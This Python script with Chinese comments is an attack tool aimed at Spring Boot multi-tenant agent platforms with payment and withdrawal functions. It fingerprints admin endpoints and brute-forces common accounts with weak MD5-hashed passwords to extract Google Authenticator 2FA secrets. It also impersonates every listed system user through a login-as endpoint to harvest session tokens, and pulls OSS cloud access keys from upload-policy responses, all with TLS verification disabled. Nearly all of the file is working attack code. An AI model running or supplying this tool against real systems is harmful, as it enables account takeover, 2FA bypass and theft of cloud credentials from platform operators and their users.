#!/usr/bin/env python3
"""
java_agent_platform_probe.py — Java 多租户代理平台探针

检测 getGoogleAuthAdmin GA Secret 泄露 + BFLA + OSS AK 泄露。
适用于 ADMIN/AGENT/MANAGER/STAFF 四层体系的 Spring Boot 多租户平台。

用法:
  python3 炼蛊房/java_agent_platform_probe.py --base https://授权站/api --out 案卷/.../
  python3 炼蛊房/java_agent_platform_probe.py --base https://目标 --phase recon
  python3 炼蛊房/java_agent_platform_probe.py --base https://目标 --phase ga-leak
  python3 炼蛊房/java_agent_platform_probe.py --base https://目标 --phase full --out /tmp/probe_out

Phases:
  recon   — 端点指纹探测
  ga-leak — GA Secret 泄露 + 弱口令
  bfla    — BFLA 用户冒充（需 --token）
  oss     — OSS policy AK 泄露（需 --token）
  full    — 全链路
"""

import argparse, hashlib, json, os, ssl, sys, time, urllib.request, urllib.error

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

WEAK_PASSWORDS = [
    ("123456",   "e10adc3949ba59abbe56e057f20f883e"),
    ("admin123", "0192023a7bbd73250516f069df18b500"),
    ("888888",   "21218cca77804d2ba1922c33e0151105"),
    ("666666",   "f379eaf3c831b04de153469d1bec345e"),
    ("abc123",   "e99a18c428cb38d5f260853678922e03"),
    ("password", "5f4dcc3b5aa765d61d8327deb882cf99"),
]

COMMON_ACCOUNTS = ["admin", "test", "demo", "agent", "agent_1", "superadmin"]

RECON_ENDPOINTS = [
    ("GET",  "/account/login/manage",           "管理端登录"),
    ("GET",  "/manage/member/getList?pageNum=1&pageSize=1", "会员列表"),
    ("GET",  "/manage/user/getOptimaList?pageNum=1&pageSize=1", "系统用户列表"),
    ("GET",  "/manage/oss/policy?type=IMAGE",   "OSS 上传策略"),
    ("POST", "/account/getGoogleAuthAdmin",     "GA Secret 获取"),
    ("GET",  "/manage/recharge/getPageList?pageNum=1&pageSize=1", "充值列表"),
    ("GET",  "/manage/withdraw/getPageList?pageNum=1&pageSize=1", "提现列表"),
    ("GET",  "/manage/fundRecord/getPageList?pageNum=1&pageSize=1", "资金流水"),
    ("GET",  "/manage/product/getList?pageNum=1&pageSize=1", "产品列表"),
]


def api(base, method, path, data=None, token=None, timeout=10):
    url = f"{base}{path}"
    headers = {"Accept": "application/json", "Content-Type": "application/json"}
    if token:
        headers["Authorization"] = token
    try:
        body = json.dumps(data).encode() if data else None
        req = urllib.request.Request(url, body, headers=headers, method=method)
        resp = urllib.request.urlopen(req, context=CTX, timeout=timeout)
        return resp.getcode(), json.loads(resp.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}
    except Exception as e:
        return 0, {"error": str(e)[:120]}


def phase_recon(base, token=None):
    """端点指纹探测"""
    print("\n" + "=" * 60)
    print("  Phase: RECON — 端点指纹探测")
    print("=" * 60)
    hits = []
    for method, path, label in RECON_ENDPOINTS:
        code, body = api(base, method, path, token=token)
        status = "✅" if code in (200, 405) else "❌"
        msg = body.get("message", "")[:60] if isinstance(body, dict) else ""
        print(f"  {status} [{code}] {method:4s} {path}  — {label} {msg}")
        if code in (200, 405):
            hits.append({"method": method, "path": path, "label": label, "code": code})
    print(f"\n  命中 {len(hits)}/{len(RECON_ENDPOINTS)} 个端点")
    return hits


def phase_ga_leak(base):
    """GA Secret 泄露 + 弱口令碰撞"""
    print("\n" + "=" * 60)
    print("  Phase: GA-LEAK — Google Auth Secret 泄露")
    print("=" * 60)
    results = []
    for account in COMMON_ACCOUNTS:
        for pwd_plain, pwd_md5 in WEAK_PASSWORDS:
            code, body = api(base, "POST", "/account/getGoogleAuthAdmin",
                             data={"account": account, "password": pwd_md5})
            if body.get("code") == 200 and body.get("data"):
                secret = body["data"].get("secretKey", "")
                print(f"  ★★★ HIT: account={account} password={pwd_plain} → secretKey={secret}")
                results.append({
                    "account": account,
                    "password_plain": pwd_plain,
                    "password_md5": pwd_md5,
                    "secret_key": secret,
                    "bound": body["data"].get("isBind", None),
                })
                break
            elif body.get("message", "") == "账号不存在":
                break
    if not results:
        print("  未命中任何弱口令")
    else:
        print(f"\n  共命中 {len(results)} 个账号")
    return results


def phase_bfla(base, token):
    """BFLA 用户冒充"""
    print("\n" + "=" * 60)
    print("  Phase: BFLA — 用户冒充")
    print("=" * 60)
    code, body = api(base, "GET", "/manage/user/getOptimaList?pageNum=1&pageSize=200", token=token)
    if not body.get("data"):
        print(f"  无法获取用户列表: {body.get('message', '')[:80]}")
        return []

    users = body["data"].get("records", body["data"].get("list", []))
    total = body["data"].get("total", len(users))
    print(f"  系统用户: {total}")

    results = []
    for u in users:
        uid = u.get("id", u.get("userId", ""))
        name = u.get("name", u.get("account", ""))
        role = u.get("role", "")
        code2, body2 = api(base, "POST", f"/manage/user/login/{uid}", token=token)
        ok = body2.get("data", {}).get("token") if body2.get("data") else None
        status = "✅" if ok else "❌"
        msg = body2.get("message", "")[:40] if not ok else ""
        print(f"  {status} {role:8s} {name:20s} (ID:{uid}) {msg}")
        if ok:
            results.append({
                "userId": uid, "name": name, "role": role,
                "token": ok[:40] + "...",
            })
    print(f"\n  可冒充: {len(results)}/{len(users)}")
    return results


def phase_oss(base, token):
    """OSS policy AK 泄露"""
    print("\n" + "=" * 60)
    print("  Phase: OSS — AK 泄露检测")
    print("=" * 60)
    results = []
    for upload_type in ["IMAGE", "ICON", "FILE", "VIDEO"]:
        code, body = api(base, "GET", f"/manage/oss/policy?type={upload_type}", token=token)
        if body.get("data") or body.get("accessid"):
            d = body.get("data", body)
            ak = d.get("accessid", d.get("accessKeyId", ""))
            host = d.get("host", "")
            if ak:
                print(f"  ★ type={upload_type}: AK={ak} host={host}")
                results.append({"type": upload_type, "ak": ak, "host": host})
    if not results:
        print("  未发现 OSS AK 泄露")
    return results


def save_results(out_dir, results):
    os.makedirs(out_dir, exist_ok=True)
    path = os.path.join(out_dir, "probe_results.json")
    with open(path, "w") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"\n  结果已保存: {path}")


def main():
    parser = argparse.ArgumentParser(description="Java 多租户代理平台探针")
    parser.add_argument("--base", required=True, help="API 基础 URL (如 https://授权站/api)")
    parser.add_argument("--phase", default="full", choices=["recon", "ga-leak", "bfla", "oss", "full"])
    parser.add_argument("--token", help="已有 token（bfla/oss phase 需要）")
    parser.add_argument("--out", help="输出目录")
    args = parser.parse_args()

    base = args.base.rstrip("/")
    results = {"target": base, "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"), "findings": {}}

    if args.phase in ("recon", "full"):
        results["findings"]["recon"] = phase_recon(base, args.token)

    if args.phase in ("ga-leak", "full"):
        results["findings"]["ga_leak"] = phase_ga_leak(base)

    if args.phase in ("bfla", "full") and args.token:
        results["findings"]["bfla"] = phase_bfla(base, args.token)
    elif args.phase == "bfla" and not args.token:
        print("  [!] BFLA phase 需要 --token 参数")

    if args.phase in ("oss", "full") and args.token:
        results["findings"]["oss"] = phase_oss(base, args.token)
    elif args.phase == "oss" and not args.token:
        print("  [!] OSS phase 需要 --token 参数")

    if args.out:
        save_results(args.out, results)

    # Summary
    print("\n" + "=" * 60)
    print("  SUMMARY")
    print("=" * 60)
    ga = results["findings"].get("ga_leak", [])
    bfla = results["findings"].get("bfla", [])
    oss = results["findings"].get("oss", [])
    recon = results["findings"].get("recon", [])
    print(f"  端点命中: {len(recon)}")
    print(f"  GA 泄露: {len(ga)} 账号")
    print(f"  BFLA 可冒充: {len(bfla)} 用户")
    print(f"  OSS AK 泄露: {len(oss)} 个")

    severity = "INFO"
    if ga:
        severity = "CRITICAL"
    elif recon:
        severity = "MEDIUM"
    print(f"  严重性: {severity}")


if __name__ == "__main__":
    main()
